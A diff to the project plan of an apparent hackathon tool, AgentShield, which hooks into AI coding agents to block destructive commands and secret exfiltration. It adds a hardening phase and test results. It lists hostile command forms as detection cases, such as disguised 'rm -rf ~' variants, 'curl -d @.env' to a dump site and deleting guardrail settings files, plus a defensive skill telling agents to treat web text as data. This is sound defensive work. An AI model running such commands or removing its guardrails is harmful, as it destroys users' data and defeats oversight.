@@ -4,7 +4,7 @@
 >
 > **Written:** Thursday 2026-10-15. **Submission:** Saturday 2026-10-17. **Freeze:** Friday night.
 >
-> **Status, Friday 2026-10-16:** P0 to P5 and the code side of P7, P8 and P9 are done and tested (383 tests). Still open: the Cloud Run deploy (P6) and the checks that need it, real-agent checks with the final build, the real Copilot session, and the video, deck and submission. Every ticked box below is backed by a test or a recorded manual check.
+> **Status, Friday 2026-10-16:** P0 to P5 and the code side of P7, P8 and P9 are done and tested. P10, the hardening after the first runs on other machines, is done and tested too (1199 tests). Still open: the Cloud Run deploy (P6) and the checks that need it, real-agent checks with the final build, a real session of each other agent app, and the video, deck and submission. Every ticked box below is backed by a test or a recorded manual check.
 >
 > **Reality check:** as of this morning the repository has only the guide. Wednesday's Gate 0 was not reached, so Phase 0 runs first today, and the schedule below is compressed by one day. The cut list at the end says what to drop if we slip further.
 
@@ -32,7 +32,8 @@ flowchart LR
     P6 --> P7["P7 Gemini<br/>extras"]
     P6 --> P8["P8 Copilot, MCP,<br/>plugin"]
     P7 --> P9["P9 Evaluation,<br/>demo, submit"]
-    P8 --> P9
+    P8 --> P10["P10 Hardening<br/>after real runs"]
+    P10 --> P9
 ```
 
 | Phase | When | Owner | Can be cut? |
@@ -46,6 +47,7 @@ flowchart LR
 | P6 Cloud Run and reliability | Fri morning | B | No |
 | P7 Gemini extras | Fri | A | Yes (judge first, then rewrite) |
 | P8 Copilot, MCP, plugin | Fri | B | Yes |
+| P10 Hardening after real runs | Fri night | all | No |
 | P9 Evaluation, demo, submission | Fri night to Sat | C (all help) | No |
 
 ## Suggested repository layout
@@ -58,7 +60,7 @@ agentshield/
     policy/                 P2: loader, merge, schema, profiles
     adapters/claude.ts      P4: Claude Code in/out format
     adapters/copilot.ts     P8
-    cli/                    P4: hook, init, doctor, check, serve, config
+    adapters/               P10: cursor, windsurf, gemini, shared tool names (tools.ts), message sniffing (index.ts)    cli/                    P4: hook, init, doctor, check, serve, config
     server/                 P5: Hono API, SSE, redaction
     mcp/                    P8
   console/                  P5: React, Vite, Tailwind
@@ -118,9 +120,9 @@ Also measured: hook p95 = 26 ms over 50 calls (stub engine, macOS). Malformed in
 
 ### Exit checks: P1
 
-- [x] Every rule id has at least one positive and one negative unit test (41 rules, enforced by `test/engine-rules.test.ts`). 46 rules after P2 and P3, still enforced
-- [x] **Benign corpus: zero BLOCK and zero ASK** (hard gate, never relaxed). 40/40 on 2026-10-15, **60/60 on 2026-10-16**
-- [x] Attack corpus: every case reaches at least its expected level. **Hit rate 50/50** on 2026-10-15, **60/60 on 2026-10-16**, plus every generated disguise of the shell attacks (our own set, not a claim about unseen attacks)
+- [x] Every rule id has at least one positive and one negative unit test (41 rules, enforced by `test/engine-rules.test.ts`). 46 rules after P2 and P3, 53 after P10, still enforced
+- [x] **Benign corpus: zero BLOCK and zero ASK** (hard gate, never relaxed). 40/40 on 2026-10-15, **60/60 on 2026-10-16**, 100/100 after P10
+- [x] Attack corpus: every case reaches at least its expected level. **Hit rate 50/50** on 2026-10-15, **60/60 on 2026-10-16**, **85/85 after P10**, plus every generated disguise of the shell attacks (our own set, not a claim about unseen attacks)
 - [x] Disguise tests: `r""m -rf ~`, `rm -r -f $HOME`, `$IFS`, `r\m`, base64 and `-EncodedCommand`, PowerShell concat and backtick, `Remove-Item -Recurse $env:USERPROFILE` are all SEVERE
 - [x] `.env.example` read is CLEAN, `rm -rf node_modules` in the project is MILD
 - [x] Hindi, emoji and Tamil text in a prompt are CLEAN
@@ -155,7 +157,7 @@ Known limits of the P1 engine: rules see one event at a time (the Rule of Two ar
 - [x] Same input `cat .env`: developer gets ASK, intern gets BLOCK
 - [x] Tester profile: AWS documentation example key in a prompt is allowed, a real-looking key is still blocked
 - [x] Monitor mode: a SEVERE event is logged but not blocked
-- [x] A malformed policy file fails closed (deny with "policy could not be loaded"), not open
+- [x] A malformed policy file is never ignored and never loosens anything. It first denied everything ("policy could not be loaded"), which made a typo in a YAML file stop all work; since P10 it switches to strict built-in settings: risky actions are denied with that reason, everyday work continues
 
 All seven are tests in `test/policy.test.ts`. Also built: the contractor profile, `config show` and `config explain`, "!" entries to remove list items where not locked, and only the company may choose monitor mode.
 
@@ -196,7 +198,7 @@ All six are tests in `test/session.test.ts` and `test/server.test.ts`. Rule ids:
 |---|---|
 | `agentshield hook claude` | Reads stdin JSON, maps it through the Claude adapter to engine events, writes the decision. Block: exit code 2 with the reason and safe alternative on stderr. Ask: JSON `permissionDecision: "ask"` with our reason. Note: allow with added context |
 | Events | `UserPromptSubmit` (block a prompt and show the safer prompt to paste), `PreToolUse` (all tools, matcher `*`), `PostToolUse` (sets legs A and B, scans written content) |
-| Fail closed | Any internal error or policy failure → deny with "AgentShield error, see log". Set the block-on-failure option where the installed version supports it |
+| Fail closed | Any internal error → deny with a reference id for the log. (A policy file that cannot be loaded switches to strict built-in settings instead, see P10.) Set the block-on-failure option where the installed version supports it |
 | Telemetry | After deciding, fire a redacted event to the console URL with a 300 ms timeout. Failure only writes to the local log |
 | `agentshield init` | Adds the hook entries to `.claude/settings.json` (project) or the user settings, without touching other hooks. Idempotent |
 | `agentshield doctor` | Checks Node version, hook entries present and pointing at this binary, unknown hook entries listed, policy loads, session folder writable, Claude Code version printed, console reachable (warning only) |
@@ -218,7 +220,7 @@ All six are tests in `test/session.test.ts` and `test/server.test.ts`. Rule ids:
 - [ ] A teammate who did not write the code installs from the README alone and gets `doctor` all green
 - [x] Console down → hook decisions unchanged, event in the local log (`test/hook.test.ts`)
 
-Also built: `init` writes the exec form with `onFailure: "block"` (Claude Code 2.1.295 or newer), so crashes and timeouts deny too; `doctor` checks the Claude Code version; the local audit log rotates at 5 MB and never holds a secret value.
+Also built: `init` writes one shell command per hook with `onFailure: "block"` (Claude Code 2.1.295 or newer; the first version wrote the exec form, which other apps cannot run: see P10), so crashes and timeouts deny too; `doctor` checks the Claude Code version; the local audit log rotates at 5 MB and never holds a secret value.
 
 ---
 
@@ -308,7 +310,7 @@ The three ticked checks are tests in `test/server.test.ts` with a mocked Gemini.
 | Copilot adapter | `agentshield hook copilot` for Copilot CLI and VS Code: action-side enforcement, captured fixtures, `init --agent copilot` |
 | MCP server | Tools `check_prompt` and `check_command` (advice only) for agents without hooks |
 | Claude Code plugin | `plugin/` folder bundling hooks, the MCP server and the skill (treat web and file text as data, do not retry blocked actions, never print secrets) |
-| Cursor adapter | Only if everything else is green |
+| Cursor adapter | Done in P10, together with Windsurf and Gemini CLI |
 
 ### Exit checks: P8
 
@@ -340,6 +342,37 @@ Evaluation table: done, see [EVALUATION.md](EVALUATION.md) (`npm run eval`). Sub
 - [ ] No real secrets, employer code or branding anywhere in repo, video or deck
 - [ ] Every number in the deck matches the evaluation table. No faked counters
 - [ ] Video, deck and template submitted with time to spare
+
+---
+
+## P10. Hardening after the first real runs
+
+**Why:** the first runs on other machines found problems no unit test had. Copilot CLI on macOS denied every tool call (`Denied by preToolUse hook ... (hook errored)`), including searches and `git status`; the `.claude/settings.json` guardrail could be deleted in ways the rules did not know; and the tool was too loud on everyday work. The goal: stay out of the way of reading and searching code, ask a person once for the few things that matter, and close the loopholes, in every major agent app.
+
+| Problem seen | Cause | Fix |
+|---|---|---|
+| Every tool call denied in Copilot CLI ("hook errored") | `init` wrote Claude Code's exec form (`command` `node` plus `args`). Copilot CLI also reads `.claude/settings.json`, ignores `args` and runs a bare `node`, which reads the hook message as a script and exits 1. Copilot fails closed on that | One shell command per hook (`node "<cli>" hook <agent>`) in every file we write, the plugin included. `doctor` runs each installed hook command the way the app does and flags the old form; `init` rewrites it |
+| One settings file read by several apps, each sending its own message shape | `.claude/settings.json` is read by Claude Code, Copilot CLI, Cursor and VS Code | The message decides the adapter, not the argument of `hook <agent>`. Unknown events are allowed silently, unknown tools are "other": never denied for being unfamiliar |
+| Guardrail files deleted, moved, emptied or rewritten | Rules saw `rm file` but not `rm -r .claude`, `git rm`, `git checkout -- <file>`, `git restore`, `mv`, `unlink`, `truncate`, `curl -o`, an interpreter one-liner, other apps' hook files (`.cursor`, `.gemini`, `.windsurf`, `.github/hooks`), or deleting `.env`, `.git` and CI files | New rules TAM-003 and DES-010, guardrail, secret and persistence path sets for every app, `.git/config` and git hooks covered, and a matrix test of about 20 spellings against every guardrail path |
+| Searches and plain reads denied or asked | Word matches inside a search pattern (`rg "\.env\|settings\.json"`), `env \| grep PATH`, a filtered `find -delete` | A pattern is not a file path, the disguise check is quote-aware, the env rule is narrower, and a corpus of everyday work must stay at zero asks |
+| Too many prompts | The same ask repeated | Approvals: an ask answered yes in the agent's own prompt is remembered for the session (matched when the app reports the result); `agentshield allow` approves ahead of time, with path patterns; `approvals` lists and revokes; the `approvals` setting is `session` or `off` and a company can lock it. Never lifted: blocks, the Rule of Two, company locks, private keys and cloud credentials |
+| Poisoned commits and pull requests | Nothing looked at what was about to leave | Commit and PR guard, GIT-001 to GIT-005: `git commit`, `git add && git commit`, `commit -a`, `git push` and `gh pr create` get the diff scanned for a live secret, a secret file, a changed agent setup, a risky command added to a script or CI file, and hidden or agent-addressed text |
+| A broken policy file denied everything | Fail closed applied to the policy loader | Strict built-in fallback: risky actions denied with the reason, everyday work continues, `doctor` names the fix |
+| Only Claude Code and Copilot | Cursor, Windsurf and Gemini CLI missing | Adapters for their own message and answer shapes. Where an app cannot ask, the denial carries the exact `agentshield allow` command to run |
+
+### Exit checks: P10
+
+- [x] Every hook command `init --agent all` writes is run through a shell with a payload: an everyday command exits 0 and `curl -d @.env <dump site>` exits 2, for Claude Code, the Copilot CLI shape, Copilot, Cursor, Windsurf and Gemini CLI (`test/agents.e2e.test.ts`)
+- [x] `doctor` fails on the old exec form and says why, `init` rewrites it, `init --remove` removes only our entries (same file)
+- [x] The same attacks stop and the same everyday work passes in every app's message shape, and each app gets its answer in its own format (`test/universal.test.ts`)
+- [x] Guardrail files cannot be removed, moved, emptied or rewritten, and deleting `.env`, `.git` or CI files asks (`test/friction.test.ts`)
+- [x] Reads, searches, listings, git reads, tests and builds are never asked or blocked (`test/friction.test.ts`, benign corpus 0 of 100)
+- [x] An ask is not repeated after a person says yes, in every app that can ask; `agentshield allow` cannot lift a block and is blocked when the agent runs it (`test/approvals.test.ts`)
+- [x] A commit carrying a key, a secret file, an agent-setup change, a download piped into a shell or hidden characters is stopped or asked, in a real temporary git repository (`test/commit-guard.test.ts`)
+- [x] A broken policy file does not stop everyday work and never loosens anything (`test/policy.test.ts`)
+- [x] Attack corpus 85 of 85, mutations 367 of 367, benign 0 of 100 blocked or asked, scenarios 10 of 10, hook p50 163 ms ([EVALUATION.md](EVALUATION.md))
+- [ ] A real session of Copilot CLI, Cursor, Windsurf and Gemini CLI with this build (they follow the vendors' documented formats so far)
+- [ ] On the machine where "hook errored" appeared: pull, rebuild, run `agentshield init --agent all` and `agentshield doctor` in the repository, then retry the `.claude/settings.json` delete test in Claude Code and Copilot CLI
 
 ---
 
